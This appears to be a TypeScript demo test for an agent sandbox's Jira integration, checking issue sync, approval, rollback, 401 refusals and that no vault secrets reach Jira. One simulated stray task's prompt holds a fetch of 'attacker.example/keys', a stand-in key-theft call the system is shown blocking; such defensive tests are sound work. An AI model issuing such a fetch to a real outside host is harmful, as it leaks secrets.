// The Jira track's demo step. Two agent tasks become Jira issues; one of them strays (tries an unknown host,
// changes a settings file) and asks for an OK. The calls the Forge panel makes approve it, then roll back just
// that task. Offline by default: a stand-in for Jira Cloud on this machine takes the box's REST calls.
// DEMO_LIVE=jira ./demo sends them to the real demo site's BOX project instead, then deletes those issues.
import fs from 'node:fs';
import http from 'node:http';
import path from 'node:path';
import type { DemoKit, Task } from '../../core/contract.ts';

export default async function (d: DemoKit) {
  const live = (process.env.DEMO_LIVE ?? '').split(/[\s,]+/).includes('jira');
  const vault = fs.readFileSync(path.join(d.home, 'vault.env'), 'utf8');
  const key = (name: string) => vault.match(new RegExp(`^${name}=(.*)$`, 'm'))?.[1].trim() ?? '';
  const stub = live ? undefined : await stubJira();
  const site = stub?.url ?? `https://${key('ATLASSIAN_SITE').replace(/^https?:\/\//, '')}`;
  const auth = 'Basic ' + Buffer.from(`${key('ATLASSIAN_EMAIL')}:${key('ATLASSIAN_API_TOKEN')}`).toString('base64');
  const jira = async (method: string, p: string, body?: unknown) => {
    const r = await fetch(site + p, { method, headers: { authorization: auth, 'content-type': 'application/json' }, body: body === undefined ? undefined : JSON.stringify(body) });
    if (!r.ok) throw new Error(`Jira ${method} ${p}: ${r.status}`);
    return r.status === 204 ? undefined : r.json();
  };
  if (live) d.check(key('ATLASSIAN_API_TOKEN'), 'DEMO_LIVE=jira: the vault has the Jira site, email and API token');

  // Turn syncing on for this run's box only. Removed at the end so later tracks' tasks stay out of Jira.
  const conf = path.join(d.home, 'jira', 'config.json');
  fs.mkdirSync(path.dirname(conf), { recursive: true });
  fs.writeFileSync(conf, JSON.stringify(stub ? { project: 'BOX', site: stub.url } : { project: 'BOX' }));
  const made: string[] = [];
  try {
    d.workspace('jira', { 'README.md': 'teh box' });
    const start = (title: string, prompt: string) => d.api<Task>('POST', '/tasks', { title, prompt, workspace: 'jira', worker: 'fake', source: 'demo' });
    const A = await start('Fix the typo in README', 'write README.md the box');
    await d.settled([A.id]);
    // B acts out an agent that misread its job: it rewrites settings, follows a planted link, then asks to ship.
    const B = await start('Tidy the settings', 'write settings.txt retries=0\nfetch https://attacker.example/keys out.txt\nask Push the new settings to production?');
    await d.waitFor('task B to wait for an OK', async () => (await d.api('GET', `/tasks/${B.id}`)).task.state === 'waiting', 15000);

    const issue = async (id: string, ok: (i: any) => boolean) => {
      const found = await d.waitFor(`the Jira issue for ${id}`, async () => (await jira('POST', '/rest/api/3/search/jql', { jql: `project = BOX AND labels = "box-${id}"`, fields: ['key'] })).issues?.[0], 30000);
      if (!made.includes(found.key)) made.push(found.key);
      return d.waitFor(`${found.key} to show the latest`, async () => {
        const i = await jira('GET', `/rest/api/3/issue/${found.key}?fields=status,labels,description,summary`);
        i.comments = (await jira('GET', `/rest/api/3/issue/${found.key}/comment`)).comments.map((c: { body: unknown }) => JSON.stringify(c.body));
        i.text = JSON.stringify(i.fields.description);
        return ok(i) ? i : undefined;
      }, 30000);
    };
    const a = await issue(A.id, (i) => i.fields.status.name === 'Done');
    d.check(a.text.includes('+the box') && a.fields.summary === 'Fix the typo in README', `${a.key}: task A is an issue in Done, with its diff`);
    const b = await issue(B.id, (i) => i.fields.status.name === 'In Review' && i.comments.length >= 2);
    d.check(b.fields.labels.includes('box-waiting'), `${b.key}: task B waits for an OK, in In Review`);
    d.check(b.text.includes('fetch https://attacker.example/keys') && b.text.includes('+retries=0'), `${b.key} holds B's prompt, steps and diff`);
    d.check(b.comments.some((c: string) => c.includes('tried to reach attacker.example')), `${b.key} has a comment for the blocked attempt on attacker.example`);
    d.check(b.comments.some((c: string) => c.includes('Push the new settings to production?')), `${b.key} has a comment asking for the OK`);

    // The calls the Forge panel makes, with and without the shared secret.
    const port = fs.readFileSync(path.join(d.home, 'api.port'), 'utf8').trim();
    const panel = (method: string, p: string, token: string, body?: unknown) =>
      fetch(`http://127.0.0.1:${port}/t/jira${p}`, { method, headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' }, body: body === undefined ? undefined : JSON.stringify(body) });
    const approval = `${B.id}.line3`;
    const refused = await Promise.all([panel('POST', '/undo', '', { task: B.id }), panel('POST', '/answer', 'guess'.repeat(10), { task: B.id, approval, approved: true })]);
    d.check(refused.every((r) => r.status === 401), 'without the shared secret the panel routes refuse to approve or roll back (401)');
    const secret = key('JIRA_BOX_SECRET');
    if (!secret) {
      console.log('  skip  approve and roll back from Jira: no JIRA_BOX_SECRET in /etc/box/vault.env on this machine');
      return;
    }
    d.check((await panel('POST', '/answer', secret, { task: A.id, approval, approved: true })).status === 404, "an approval can't be answered through another task's issue");
    await panel('POST', '/answer', secret, { task: B.id, approval, approved: true, by: 'Ben Zhou' });
    await d.settled([B.id]);
    d.check(d.view('jira', 'settings.txt') === 'retries=0', 'approved from Jira, task B finished');
    await panel('POST', '/undo', secret, { task: B.id, by: 'Ben Zhou' });
    d.check(d.view('jira', 'settings.txt') === undefined && d.view('jira', 'README.md') === 'the box', 'rolled back from Jira: B\'s settings change is gone, A\'s fix stays');
    const audit = await (await panel('GET', `/task?id=${B.id}`, secret)).json();
    d.check(
      audit.task.state === 'undone' && audit.audit.some((l: { text: string }) => l.text === 'Approved by jira:Ben Zhou') && audit.blocked[0]?.host.startsWith('attacker.example'),
      'the panel\'s audit view shows the block, who approved and the roll back',
    );
    const b2 = await issue(B.id, (i) => i.fields.labels.includes('box-undone') && i.comments.some((c: string) => c.includes('Rolled back by jira:Ben Zhou')));
    d.check(b2.fields.status.name === 'Done' && b2.text.includes('Rolled back by jira:Ben Zhou'), `${b2.key} says who rolled it back, in a comment and the description`);
    const secrets = vault.split('\n').map((l) => l.split('=').slice(1).join('=').trim()).filter((v) => v.length > 8);
    // Live, check the text the box wrote; Jira's own JSON carries the site and email, which are not secrets.
    const sent = stub ? stub.bodies.join('\n') : JSON.stringify([a.text, a.comments, b2.text, b2.comments]);
    d.check(!secrets.some((s) => sent.includes(s)), 'no vault secret is in anything the box sent to Jira');
  } finally {
    fs.rmSync(conf, { force: true });
    stub?.server.close();
    // Live runs leave the BOX project as they found it.
    if (live) for (const k of made) await jira('DELETE', `/rest/api/3/issue/${k}`).catch(() => {});
  }
}

/** A stand-in for the few Jira Cloud REST calls the box makes, keeping issues in memory. */
async function stubJira() {
  type Issue = { key: string; fields: Record<string, any>; props: Record<string, unknown>; comments: { body: unknown }[] };
  const issues = new Map<string, Issue>();
  const bodies: string[] = [];
  const STATUSES = ['To Do', 'In Progress', 'In Review', 'Done'];
  const server = http.createServer(async (req, res) => {
    let text = '';
    for await (const c of req) text += c;
    bodies.push(text);
    const b = text ? JSON.parse(text) : {};
    const send = (code: number, data?: unknown) => res.writeHead(code, { 'content-type': 'application/json' }).end(data === undefined ? '' : JSON.stringify(data));
    const p = new URL(req.url ?? '/', 'http://jira').pathname;
    if (req.method === 'POST' && p === '/rest/api/3/search/jql') {
      const label = b.jql.match(/labels = "([^"]+)"/)?.[1];
      return send(200, { issues: [...issues.values()].filter((i) => i.fields.labels.includes(label)).map((i) => ({ key: i.key })) });
    }
    if (req.method === 'POST' && p === '/rest/api/3/issue') {
      const key = `BOX-${issues.size + 1}`;
      issues.set(key, { key, fields: { ...b.fields, status: { name: 'To Do' } }, props: {}, comments: [] });
      return send(201, { key });
    }
    const m = p.match(/^\/rest\/api\/3\/issue\/([\w-]+)(\/.*)?$/);
    const i = m && issues.get(m[1]);
    if (!i) return send(404, { errorMessages: ['no such issue'] });
    const rest = `${req.method} ${m[2] ?? ''}`;
    if (rest === 'GET ') return send(200, { key: i.key, fields: i.fields });
    if (rest === 'PUT ') return (Object.assign(i.fields, b.fields), send(204));
    if (rest.startsWith('PUT /properties/')) return ((i.props[rest.slice(16)] = b), send(200, {}));
    if (rest === 'GET /transitions') return send(200, { transitions: STATUSES.map((name, id) => ({ id: String(id), to: { name } })) });
    if (rest === 'POST /transitions') return ((i.fields.status = { name: STATUSES[Number(b.transition.id)] }), send(204));
    if (rest === 'POST /comment') return (i.comments.push(b), send(201, {}));
    if (rest === 'GET /comment') return send(200, { comments: i.comments });
    send(404, {});
  });
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  return { server, bodies, url: `http://127.0.0.1:${(server.address() as { port: number }).port}` };
}
